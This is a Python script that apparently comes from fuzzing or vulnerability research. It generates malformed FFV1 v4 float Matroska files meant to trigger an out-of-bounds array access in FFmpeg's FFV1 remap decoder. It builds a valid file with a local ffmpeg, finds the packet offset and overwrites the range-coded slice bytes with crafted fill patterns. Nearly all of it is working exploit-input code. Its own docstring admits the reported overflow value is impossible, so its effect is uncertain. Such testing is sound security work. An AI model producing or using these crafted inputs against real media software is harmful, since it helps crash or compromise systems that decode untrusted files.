#!/usr/bin/env python3
"""
PoC generator for VULN 001: OOB Stack Array Access in decode_current_mul via 32-bit FFV1 remap
Location: ffv1dec.c decode_remap() / decode_current_mul()

Trigger conditions:
  - FFV1 stream with bits_per_raw_sample=32 (float format: gbrpf32le)
  - sc->remap set to 1 or 2 (enabled by combined_version >= 0x40004, i.e., FFV1 v4)
  - mul_count=4096 (max allowed) decoded from range-coded remap header
  - Multiplier values driving i toward 0xFFFFFFFF so decode_current_mul is called
    with i=0x100000000 (one past the valid 32-bit domain)

Approach:
  1. Use the build ffmpeg subprocess to generate a valid FFV1 v4 gbrpf32le file
     (4x4 frame) with remap_mode=2 and remap_optimizer=5.
  2. Use ffprobe to find the exact byte offset/size of the FFV1 packet in the MKV.
  3. Corrupt the range-coder bytes at the beginning of the FFV1 slice to push
     the decoder toward large mul_count values and fast traversal to i=0xFFFFFFFF.
  4. Save the mutated file as vuln_001_input.mkv.

Math note (see vuln_001_notes.md for full analysis):
  decode_current_mul: ndx = (i * mul_count) >> 32
  When i=0x100000000, mul_count=4096: ndx = 4096 (last valid element of mul[4097]).
  The OOB value 268435456 stated in the report is mathematically impossible under
  the current mul_count<=4096 constraint. The PoC targets the boundary call itself.
"""

import subprocess
import sys
import os
import re
import tempfile

FFMPEG  = "/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
FFPROBE = FFMPEG.replace("ffmpeg", "ffprobe")
OUT_DIR = os.path.dirname(os.path.abspath(__file__))
VALID_FILE = os.path.join(OUT_DIR, "vuln_001_ref.mkv")
INPUT_FILE = os.path.join(OUT_DIR, "vuln_001_input.mkv")


# ───────────────────────────────────────────────────────────────────────────────
# Step 1: generate a valid FFV1 v4 float file using the build ffmpeg
# ───────────────────────────────────────────────────────────────────────────────
def generate_valid_file(width=4, height=4):
    frame_size = width * height * 3 * 4   # 3 planes (G,B,R), 4 bytes per float
    raw_frame  = b'\x00' * frame_size      # all-zero frame (0.0f per channel)

    with tempfile.NamedTemporaryFile(suffix='.raw', delete=False) as tf:
        tf.write(raw_frame)
        raw_path = tf.name

    try:
        result = subprocess.run([
            FFMPEG, '-y',
            '-f', 'rawvideo',
            '-pixel_format', 'gbrpf32le',
            '-video_size', f'{width}x{height}',
            '-framerate', '1',
            '-i', raw_path,
            '-c:v', 'ffv1',
            '-remap_mode', '2',
            '-remap_optimizer', '5',
            '-strict', 'experimental',    # required for FFV1 v4 (float+remap)
            '-frames:v', '1',
            VALID_FILE,
        ], capture_output=True, text=True)
    finally:
        if os.path.exists(raw_path):
            os.unlink(raw_path)

    if not os.path.exists(VALID_FILE) or os.path.getsize(VALID_FILE) == 0:
        print(f"[ERROR] ffmpeg failed:\n{result.stderr[-800:]}")
        return False

    print(f"[+] Generated valid FFV1 float file: {VALID_FILE} ({os.path.getsize(VALID_FILE)} bytes)")
    return True


# ───────────────────────────────────────────────────────────────────────────────
# Step 2: use ffprobe to find the FFV1 packet offset and size in the MKV
# ───────────────────────────────────────────────────────────────────────────────
def find_packet_offset(mkv_path):
    """
    Run ffprobe -show_packets -of compact and parse pos= and size= for the
    first video packet.  Returns (offset, size) or (None, None).
    """
    r = subprocess.run(
        [FFPROBE, '-show_packets', '-of', 'compact', mkv_path],
        capture_output=True, text=True
    )
    for line in r.stdout.splitlines():
        if 'codec_type=video' in line:
            m_pos  = re.search(r'\bpos=(\d+)',  line)
            m_size = re.search(r'\bsize=(\d+)', line)
            if m_pos and m_size:
                return int(m_pos.group(1)), int(m_size.group(1))
    return None, None


# ───────────────────────────────────────────────────────────────────────────────
# Step 3: mutate the FFV1 range-coder bytes at the discovered offset
#
# The FFV1 slice contains:
#   [slice header: range-coded sx, sy, sw, sh, quant_table_index, etc.]
#   [remap data: range-coded mul_count, then the multiplier sequence]
#   [pixel data]
#
# Filling the first N bytes of the slice with 0xFF drives the range coder
# toward high-probability symbol values → large mul_count (approaching 4096)
# and large multiplier values → faster traversal of i toward 0xFFFFFFFF.
#
# This triggers the boundary call: decode_current_mul(i = 0x100000000).
# ───────────────────────────────────────────────────────────────────────────────
def mutate(mkv_bytes, offset, size, fill_byte, fill_offset=0, fill_len=None):
    data = bytearray(mkv_bytes)
    if fill_len is None:
        fill_len = size
    start = offset + fill_offset
    end   = min(offset + fill_offset + fill_len, offset + size)
    for i in range(start, end):
        data[i] = fill_byte
    return bytes(data)


# ───────────────────────────────────────────────────────────────────────────────
# Main
# ───────────────────────────────────────────────────────────────────────────────
def main():
    print("[*] VULN 001 PoC Generator: FFV1 decode_remap OOB via 32-bit float remap")
    print()

    # Step 1
    if not generate_valid_file():
        print("[FATAL] Cannot create reference FFV1 file.")
        sys.exit(1)

    # Verify it decodes
    r = subprocess.run(
        [FFMPEG, '-y', '-i', VALID_FILE, '-f', 'null', '-'],
        capture_output=True, text=True
    )
    if r.returncode != 0:
        print(f"[WARN] Reference decode error (exit {r.returncode}): {r.stderr[-300:]}")
    else:
        print("[+] Reference file decodes OK")

    # Step 2
    pkt_offset, pkt_size = find_packet_offset(VALID_FILE)
    if pkt_offset is None:
        # Fallback: scan for 0xa3 0x40 (SimpleBlock + 2-byte size vint pattern)
        with open(VALID_FILE, 'rb') as f:
            raw = f.read()
        for i in range(50, len(raw) - 4):
            if raw[i] == 0xa3 and raw[i+1] == 0x40:
                # 2-byte vint: value = (raw[i+1] & 0x3f) << 8 | raw[i+2]
                sz = ((raw[i+1] & 0x3f) << 8) | raw[i+2]
                # skip ID(1) + size(2) + track_vint(1) + timecode(2) + flags(1) = 7 bytes
                pkt_offset = i + 7
                pkt_size   = sz - 4
                break
        if pkt_offset is None:
            print("[ERROR] Cannot locate FFV1 packet in MKV; aborting.")
            sys.exit(1)
        print(f"[+] Fallback: located packet via scan at offset {pkt_offset:#x}, size {pkt_size}")
    else:
        print(f"[+] ffprobe: FFV1 packet at file offset {pkt_offset:#x}, size {pkt_size}")

    with open(VALID_FILE, 'rb') as f:
        mkv_bytes = f.read()

    # The ffprobe 'pos' field is the Matroska SimpleBlock payload start, which
    # includes: track-number vint (1 byte) + timecode (2 bytes) + flags (1 byte)
    # before the actual FFV1 bitstream.  We must skip those 4 bytes.
    ffv1_offset = pkt_offset + 4
    ffv1_size   = pkt_size   - 4
    print(f"[+] FFV1 bitstream at file offset {ffv1_offset:#x}, size {ffv1_size}")

    # Step 3a: fill entire FFV1 slice with 0xFF (maximises range-coder symbol values)
    # → drives mul_count toward 4096 and multiplier values high → i→0xFFFFFFFF faster
    mutated_ff = mutate(mkv_bytes, ffv1_offset, ffv1_size, 0xFF)
    with open(INPUT_FILE, 'wb') as f:
        f.write(mutated_ff)
    print(f"[+] Wrote 0xFF-fill input: {INPUT_FILE} ({len(mutated_ff)} bytes)")

    # Step 3b: alternating 0x00/0xFF (different range-coder trajectory)
    alt_path = os.path.join(OUT_DIR, "vuln_001_input_alt.mkv")
    data2 = bytearray(mkv_bytes)
    for i in range(ffv1_offset, min(ffv1_offset + ffv1_size, len(data2))):
        data2[i] = 0xFF if ((i - ffv1_offset) % 2 == 0) else 0x00
    with open(alt_path, 'wb') as f:
        f.write(bytes(data2))
    print(f"[+] Wrote alternating-fill input: {alt_path}")

    # Step 3c: keep slice header intact (first 20 bytes), corrupt only the remap section
    # The FFV1 v4 slice header encodes ~8-15 range-coder symbols (sx, sy, sw, sh,
    # quant_table_idx, picture_structure, SAR, reset_ctx, slice_coding_mode, remap).
    # We skip the first 20 bytes to preserve the slice header and corrupt from the
    # remap section onward.
    partial_path = os.path.join(OUT_DIR, "vuln_001_input_partial.mkv")
    mutated_partial = mutate(mkv_bytes, ffv1_offset, ffv1_size, 0xFF, fill_offset=20)
    with open(partial_path, 'wb') as f:
        f.write(mutated_partial)
    print(f"[+] Wrote partial-fill input (skip first 20 bytes): {partial_path}")

    print()
    print("[*] Done. Run vuln_001_run.sh to test all inputs.")


if __name__ == '__main__':
    main()
